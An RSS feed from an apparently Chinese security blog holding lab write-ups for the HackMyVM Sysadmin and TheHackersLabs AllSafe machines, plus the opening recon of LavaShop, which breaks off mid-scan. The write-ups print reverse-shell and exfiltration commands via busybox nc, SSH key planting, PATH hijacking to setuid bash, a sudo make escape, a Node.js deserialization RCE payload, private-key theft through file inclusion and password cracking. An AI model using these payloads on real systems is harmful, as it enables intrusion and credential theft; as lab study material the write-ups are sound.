<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>Sunset Blog</title>
        <link>https://www.sunsetaction.top</link>
        <description>Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。</description>
        <lastBuildDate>Sat, 25 Oct 2025 15:54:43 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Feed for Node.js</generator>
        <language>zh-CN</language>
        <image>
            <title>Sunset Blog</title>
            <url>https://www.sunsetaction.top/images/logo.png</url>
            <link>https://www.sunsetaction.top</link>
        </image>
        <copyright>All rights reserved 2025, Sunset</copyright>
        <item>
            <title><![CDATA[HackMyVM - Sysadmin]]></title>
            <link>https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin</guid>
            <pubDate>Sat, 25 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Sysadmin. https://hackmyvm.eu/machines/machine.php?vm=Sysadmin Recon PortScan 枚举 80 端口，看样子是文件上传，并且是让我们上传 C 语言文件，并且会运行 端口扫描 F12 查看源码时发现 RCE 这里的猜测是，上传 c...]]></description>
            <content:encoded><![CDATA[
# Sysadmin.

> https://hackmyvm.eu/machines/machine.php?vm=Sysadmin
> 

![image.png](/post-images/HackMyVMSysadmin/image.png)

## Recon

### PortScan

```python
➜  ~ nmap -sT -min-rate 10000 -p- 192.168.56.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:08 CST
Nmap scan report for 192.168.56.210
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds
```

```python
➜  ~ nmap -sT -A -p 22,80 192.168.56.210        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:14 CST
Nmap scan report for 192.168.56.210
Host is up (0.00049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: C Code Upload
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.56.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
```

### 枚举

`80` 端口，看样子是文件上传，并且是让我们上传 `C` 语言文件，并且会运行

![image.png](/post-images/HackMyVMSysadmin/image1.png)

端口扫描

```python
➜  sysadmin feroxbuster --url http://192.168.56.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt

                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.210
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       59l      156w     2384c http://192.168.56.210/index.php
200      GET       59l      156w     2384c http://192.168.56.210/
[####################] - 50s   661641/661641  0s      found:2       errors:1      
[####################] - 50s   661635/661635  13173/s http://192.168.56.210/
```

F12 查看源码时发现

```python
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
```

![image.png](/post-images/HackMyVMSysadmin/image2.png)

## RCE

这里的猜测是，上传 c 文件后，然后通过上边的语句进行编译然后运行，但是编译语句中带有 `-nostdinc` 不使用默认系统库函数及不搜索默认头文件路径，所以我们无法直接导入 `stdio.h` 等，需要绕过

通过使用内联函数定义，要在不依赖 `stdlib.h` 的情况下调用 system，您可以手动声明它：

测试一下是否存在RCE

```python
int system(const char *command);
int main() {
    system("busybox nc 192.168.56.5 1234"); // Attempt to spawn a shell
    return 0;
}
```

存在 RCE

![image.png](/post-images/HackMyVMSysadmin/image3.png)

进行反弹 `shell`

```python
int system(const char *command);
int main() {
    system("busybox nc 192.168.56.5 1234 -e /bin/bash"); // Attempt to spawn a shell
    return 0;
}
```

但是连上连上不到一会就断掉了

![image.png](/post-images/HackMyVMSysadmin/image4.png)

尝试写公钥，首先获取用户名

```python
int system(const char *command);
int main() {
    system("echo $(whoami) | busybox nc 192.168.56.5 80");
    return 0;
}
```

得到用户名 `echo`

![image.png](/post-images/HackMyVMSysadmin/image5.png)

写公钥

```python
# Kali
cat ~/.ssh/authorized_keys >  authorized_keys
python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```python
int system(const char *command);
int main() {
    system("mkdir -p ~/.ssh && busybox wget 192.168.56.5/authorized_keys -O ~/.ssh/authorized_keys");
    return 0;
}
```

![image.png](/post-images/HackMyVMSysadmin/image6.png)

通过私钥进行登录

![image.png](/post-images/HackMyVMSysadmin/image7.png)

进去后能读 `user.txt`

```python
echo@Sysadmin:~$ cat user.txt 
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

## 命令劫持

查看 `sudo` 权限

```python
echo@Sysadmin:~$ sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

其中 `!env_reset` 可能存在路径劫持

查看脚本

```python
echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh
#!/bin/bash

#===================================
# Daily System Info Report
#===================================

echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m

echo "------------------------------------------------------"
echo "Report complete at $(date)"
```

可以看到很多可以劫持的命令

```python
echo@Sysadmin:~$ echo "chmod +s /bin/bash" > /tmp/df
echo@Sysadmin:~$ chmod +x /tmp/df
echo@Sysadmin:~$ export PATH="/tmp:$PATH"
echo@Sysadmin:~$ sudo /usr/local/bin/system-info.sh
```

![image.png](/post-images/HackMyVMSysadmin/image8.png)]]></content:encoded>
            <category>靶机</category>
            <category>HackMyVM</category>
            <category>Linux</category>
            <category>RCE</category>
            <category>Hijack</category>
            <category>Path_Hijack</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - AllSafe]]></title>
            <link>https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe</guid>
            <pubDate>Tue, 21 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[AllSafe https://labs.thehackerslabs.com/machine/139 Recon PortScan 枚举 80 端口，域名是 allsafe.thl 目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的 主站中还有一个功能，可以提交网址，所以索性测试了 SSRF...]]></description>
            <content:encoded><![CDATA[
# AllSafe

> https://labs.thehackerslabs.com/machine/139
> 

![image.png](/post-images/TheHackersLabsAllSafe/image.png)

## Recon

### PortScan

```python
➜  AllSafe nmap -sT -min-rate 10000 -p- 192.168.56.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:38 CST
Nmap scan report for 192.168.56.130
Host is up (0.00036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 18.73 seconds
```

```python
➜  AllSafe nmap -sT -A -p 22,80,2222 192.168.56.130       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:40 CST
Nmap scan report for 192.168.56.130
Host is up (0.00056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.65 ((Debian))
|_http-title: Allsafe
|_http-server-header: Apache/2.4.65 (Debian)
2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
MAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.56.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds
```

### 枚举

80 端口，域名是 `allsafe.thl`

![image.png](/post-images/TheHackersLabsAllSafe/image1.png)

目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的

![image.png](/post-images/TheHackersLabsAllSafe/image2.png)

主站中还有一个功能，可以提交网址，所以索性测试了 SSRF，但是没有触发，但是测试 `localhost` 的时候返回了 `1234565even`

![image.png](/post-images/TheHackersLabsAllSafe/image3.png)

后面没找到其他的东西

尝试子域名爆破

```python
➜  AllSafe ffuf -u 'http://allsafe.thl/' -H 'host:FUZZ.allsafe.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 7016

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://allsafe.thl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.allsafe.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7016
________________________________________________

intranet                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
:: Progress: [114442/114442] :: Job [1/1] :: 699 req/sec :: Duration: [0:01:57] :: Errors: 0 ::
```

得到子域名 `intranet` ，访问，登录需要员工 ID 格式为 `x-xxx-xxxx` ，密码估计就是上边的得到的 `123456Seven`

![image.png](/post-images/TheHackersLabsAllSafe/image4.png)

进行信息收集，目录爆破

```python
➜  AllSafe gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://intranet.allsafe.thl/                    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://intranet.allsafe.thl/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> login.php]
/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]
/login.php            (Status: 200) [Size: 2075]
/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]
/profile.php          (Status: 200) [Size: 2305]
/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]
/customers.php        (Status: 200) [Size: 11072]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]
/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]
```

看到有 `customers.php` ，进行查看，得到很多的员工信息，但是并没有员工 ID

![image.png](/post-images/TheHackersLabsAllSafe/image5.png)

最后在主站的 “我们的团队” 中找到了类似员工 ID 的东西

![image.png](/post-images/TheHackersLabsAllSafe/image6.png)

`0-477-9990`

![image.png](/post-images/TheHackersLabsAllSafe/image7.png)

测试登录 `0-477-9990`:`123456Seven` 

成功进入后台

![image.png](/post-images/TheHackersLabsAllSafe/image8.png)

## 后台利用

### 信息收集

后台尝试寻找可利用的点

点击 `Contrato` 可以查看合同

![image.png](/post-images/TheHackersLabsAllSafe/image9.png)

当前在 `process` 目录中

![image.png](/post-images/TheHackersLabsAllSafe/image10.png)

在其中的一个文档中还能翻到 `/etc/passwd` 的输出

![image.png](/post-images/TheHackersLabsAllSafe/image11.png)

查看其 tex 文件，可以看到 `Empresa` 参数可以进行文件包含

![image.png](/post-images/TheHackersLabsAllSafe/image12.png)

其中还有一个读取了 `SSH` 私钥的

![image.png](/post-images/TheHackersLabsAllSafe/image13.png)

查看到读取的是 `/home/parker/.ssh/id_rsa`

![image.png](/post-images/TheHackersLabsAllSafe/image14.png)

### 任意文件读取

将 `PDF` 上的 `id_rsa` 进行修复

```python
# 假设文件是 key.txt
cat id_rsa | grep -v "PRIVATE KEY" | tr -d ' \n' | fold -w 70 > fixed_key_body.txt
# 然后加上头尾
echo "-----BEGIN OPENSSH PRIVATE KEY-----" > fixed_key.txt
cat fixed_key_body.txt >> fixed_key.txt
echo "-----END OPENSSH PRIVATE KEY-----" >> fixed_key.txt
```

但是貌似不起效

```python
➜  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222
parker@192.168.56.130's password: 
```

重新读取一下 `id_rsa`，和上边一样进行包含即可

```python
\lstinputlisting{/home/parker/.ssh/id_rsa}
```

![image.png](/post-images/TheHackersLabsAllSafe/image15.png)

![image.png](/post-images/TheHackersLabsAllSafe/image16.png)

再和上边一样修复一次后进行登录，成功登录

```python
➜  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222
parker@153504fd9bcb:~$ 
```

## 横向移动 - 容器逃逸

### to goddard

进来后我们是在容器里面

```python
parker@153504fd9bcb:~$ ls -al /
total 68
drwxr-xr-x   1 root root 4096 Oct 11 18:41 .
drwxr-xr-x   1 root root 4096 Oct 11 18:41 ..
-rwxr-xr-x   1 root root    0 Oct 11 18:41 .dockerenv
lrwxrwxrwx   1 root root    7 May 12 19:25 bin -> usr/bin
drwxr-xr-x   2 root root 4096 May 12 19:25 boot
drwxr-xr-x   5 root root  340 Oct 21 04:28 dev
drwxr-xr-x   1 root root 4096 Oct 11 18:41 etc
drwxr-xr-x   1 root root 4096 Aug 24 18:39 home
lrwxrwxrwx   1 root root    7 May 12 19:25 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May 12 19:25 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Aug 11 00:00 media
drwxr-xr-x   2 root root 4096 Aug 11 00:00 mnt
drwxr-xr-x   2 root root 4096 Aug 11 00:00 opt
dr-xr-xr-x 149 root root    0 Oct 21 04:28 proc
drwx------   1 root root 4096 Aug 24 18:39 root
drwxr-xr-x   1 root root 4096 Oct 11 18:41 run
lrwxrwxrwx   1 root root    8 May 12 19:25 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Aug 11 00:00 srv
dr-xr-xr-x  13 root root    0 Oct 21 04:28 sys
drwxrwxrwt   1 root root 4096 Oct 21 06:23 tmp
drwxr-xr-x   1 root root 4096 Aug 11 00:00 usr
drwxr-xr-x   1 root root 4096 Aug 12 22:31 var
```

数据库密码，但是连不上

```python
parker@153504fd9bcb:/var/www/intranet$ cat db.php 
<?php

$dsn = "mysql:host=db;dbname=allsafe;charset=utf8";
$username = "root";
$password = "31jB2rcbG1Pjorbd93eaxHW";

try {
    $pdo = new PDO($dsn, $username,  $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOExecption) {
    die("Connection failed: " . $e->getMessage());
}
```

`mail` 里面有东西

```python
parker@153504fd9bcb:/var/mail/parker$ cat meeting 
From goddard@localhost Thu Aug 21 14:05:20 2025
Date: Thu, 21 Aug 2025 14:05:20 +0000
From: goddard@localhost
To: parker@localhost
Subject: Reunión con E-Corp
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hola Oliver,

Te adjunto las notas que armé para la reunión con el cliente.  
Revisalo y confirmame si llegamos con todo.

Saludos,  
Gideon

--BOUNDARY
Content-Type: text/plain; name="meeting_notes.txt"
Content-Disposition: attachment; filename="meeting_notes.txt"
Content-Transfer-Encoding: 7bit

Meeting Notes - E-Corp
----------------------
1. Confirmar agenda con el cliente.
2. Revisar documentación técnica.
3. Validar acceso al portal con la credencial:

   Clave de acceso: 6D7033386E71556654416130494D314F70306157

4. Preparar demo corta del servicio.
--BOUNDARY--
EOF.
```

其中告诉我们这是一个秘钥 `6D7033386E71556654416130494D314F70306157`

典型 16 进制编码，解出来是 `mp38nqUfTAa0IM1Op0aW`

![image.png](/post-images/TheHackersLabsAllSafe/image17.png)

该密码是用户 `goddard` 的密码

```python
parker@153504fd9bcb:/var/mail/parker$ su goddard
Password: 
goddard@153504fd9bcb:/var/mail/parker$ 
```

### to root

查看 sudo 权限

```python
goddard@153504fd9bcb:/var/mail/parker$ sudo -l
Matching Defaults entries for goddard on 153504fd9bcb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User goddard may run the following commands on 153504fd9bcb:
    (ALL) NOPASSWD: /usr/bin/make
```

直接提权到 `root`

```python
goddard@153504fd9bcb:/var/mail/parker$ COMMAND='/bin/sh'
sudo make -s --eval=$'x:\n\t-'"$COMMAND"
# 
# id
uid=0(root) gid=0(root) groups=0(root)
```

### to cisco

家目录下有一个 `psafe3` 文件

```python
# ls
secrets.psafe3
```

`PSAFE3` 文件大多属于 `Password Safe`。 `Password Safe` 可让您安全轻松地创建安全加密的用户名/密码列表。

因为需要密码才能打开，我们通过 `john` 进行爆破

```python
➜  AllSafe pwsafe2john secrets.psafe3 > hash

➜  AllSafe john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockandroll      (secret)     
1g 0:00:00:43 DONE (2025-10-21 15:51) 0.02321g/s 190.2p/s 190.2c/s 190.2C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

得到密码 `rockandroll`

文件通过 `password safe` 打开

![image.png](/post-images/TheHackersLabsAllSafe/image18.png)

```python
sMpam!xxxxxxxxxxxxxxxxxx
```

![image.png](/post-images/TheHackersLabsAllSafe/image19.png)

## 提权

### 信息收集

当前目录文件

```python
cisco@allsafe:~$ ls
darkarmy.bin  user.txt
```

家目录下能读取 user.txt

```python
cisco@allsafe:~$ cat user.txt 
e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

darkarmy.bin

```python
cisco@allsafe:~$ strings darkarmy.bin 
70617373776f72643d64726b32303235210a
```

还是 HEX ，能得到一个密码 `drk2025!`

![image.png](/post-images/TheHackersLabsAllSafe/image20.png)

家目录下隐藏文件 `.unknow`

```python
cisco@allsafe:~$ cat .unknown
Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
A partir de ahora, todo contacto será únicamente a través del canal seguro.

Conéctate al servidor de mensajería y entra en la sala:
    dark-ops

No intentes usar este acceso para nada más que lo acordado.
Nosotros decidimos cuándo y cómo se conversa.
```

> 如果您想联系我们，请不要使用常规渠道。
从现在开始，所有联系都将仅通过安全渠道进行。
> 
> 
> 连接到消息服务器并进入房间：
> dark-ops
> 
> 请勿尝试将此访问权限用于任何未经约定的用途。
> 我们决定对话的时间和方式。
> 

查看正在监听端口，有两个开在本地的

```python
cisco@allsafe:~$ ss -tulpn
Netid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  
udp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                         127.0.0.1:40089                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                           0.0.0.0:80                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                           0.0.0.0:2222                                           0.0.0.0:*                                              
tcp                    LISTEN                  0                       511                                          127.0.0.1:3000                                           0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                              [::]:80                                                [::]:*                                              
tcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              
tcp                    LISTEN                  0                       4096                                              [::]:2222                                              [::]:* 
```

### Node.js 反序列化

3000 端口还是一个 `web` ，登录框

![image.png](/post-images/TheHackersLabsAllSafe/image21.png)

将 `3000` 端口转发出来

```python
./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 &
```

是一个登录框，需要三个参数

![image.png](/post-images/TheHackersLabsAllSafe/image22.png)

分别输入 `cisco` `dark-ops` `drk2025!` 提示认证错误

![image.png](/post-images/TheHackersLabsAllSafe/image23.png)

在 `/vat/log` 中发现 `app.log` ，不常见

![image.png](/post-images/TheHackersLabsAllSafe/image24.png)

在里边能得到两个凭据

![image.png](/post-images/TheHackersLabsAllSafe/image25.png)

```python
DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
```

将密码换成 `DLFJYxLLSzp1x5Ttpsffpg2awuJT5K` 成功连接，聊天还是用中文（

这里尝试一下 SQL 注入，SSTI 之类的，也没能找到什么

![image.png](/post-images/TheHackersLabsAllSafe/image26.png)

需要知道 3000 端口运行在什么程序上，查看一下抓的包

![image.png](/post-images/TheHackersLabsAllSafe/image27.png)

因为 `Socket.IO` 是 Node.js 的流行实时库，所以猜测它是 `Node.js`

![image.png](/post-images/TheHackersLabsAllSafe/image28.png)

在查看进程时也能看到 root 运行了 nodejs

```python
root         308  0.0  1.6 1248480 67224 ?       Ssl  06:28   0:01 node server.js 
```

还发现了这个 `Cookie` 是仅仅通过 Base64 加密了而已，模拟了其他用户后也没什么卵用

![image.png](/post-images/TheHackersLabsAllSafe/image29.png)

看了一下老夜和国外老友的WP（https://7r1umphk.github.io/post/thl_allsafe.html）（https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md）才知道这里有反序列化漏洞

一些文章：https://cloud.tencent.com/developer/article/1374840

payload：

```python
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('busybox nc 192.168.56.5 1234 -e /bin/bash', function(error,stdout,stderr){})}()"}
```

进行 `base64` 编码，替换上去

![image.png](/post-images/TheHackersLabsAllSafe/image30.png)

来到控制台，输入如下命令，先断开套接字并重新连接，服务器就会重新反序列化

```python
socket.close()
socket.connect()
```

读取 `root.txt` 即可

![image.png](/post-images/TheHackersLabsAllSafe/image31.png)

## 总结

要耐心 耐心 耐心 耐心]]></content:encoded>
            <category>靶机</category>
            <category>TheHackerLabs</category>
            <category>Linux</category>
            <category>LFI</category>
            <category>FUZZ</category>
            <category>PasswordSafe</category>
            <category>Make</category>
            <category>Nodejs反序列化</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - LavaShop]]></title>
            <link>https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop</guid>
            <pubDate>Mon, 20 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[LavaShop https://labs.thehackerslabs.com/machine/140 Recon PortScan 枚举 80 端口 1337 端口 目录扫描 看着像是存在 LFI ，枚举一下 index.php 的 page 参数 没有枚举出来，再枚举一下其他页面是否存在参数 ...]]></description>
            <content:encoded><![CDATA[
# LavaShop

> https://labs.thehackerslabs.com/machine/140
> 

![image.png](/post-images/TheHackersLabsLavaShop/image.png)

## Recon

### PortScan

```python
➜  LavaShop nmap -sT -min-rate 10000 -p- 192.168.56.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:34 CST
Nmap scan report for 192.168.56.129
Host is up (0.00051s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.68 seconds
```

```python
➜  LavaShop nmap -sT -A -p 22,80,1337 192.168.56.129   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:35 CST
Nmap scan report for 192.168.56.129
Host is up (0.00046s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http       Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://lavashop.thl/
|_http-server-header: Apache/2.4.62 (Debian)
1337/tcp open  tcpwrapped
MAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.56.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

### 枚举

`80` 端口

![image.png](/post-images/TheHackersLabsLavaShop/image1.png)

1337 端口

```python
➜  LavaShop echo "1234" | nc 192.168.56.129 1337
(UNKNOWN) [192.168.56.129] 1337 (?) : Connection refused
```

目录扫描

```python
➜  LavaShop feroxbuster --url http://lavashop.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt
                                                                                                                  
 ___  ___  __   __     __      __         __   ___                                                                
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                 
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                
by Ben "epi" Risher 🤓                 ver: 2.11.0                                                                
───────────────────────────┬──────────────────────                                                                
 🎯  Target Url            │ http://lavashop.thl                                                                  
 🚀  Threads               │ 50                                             
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
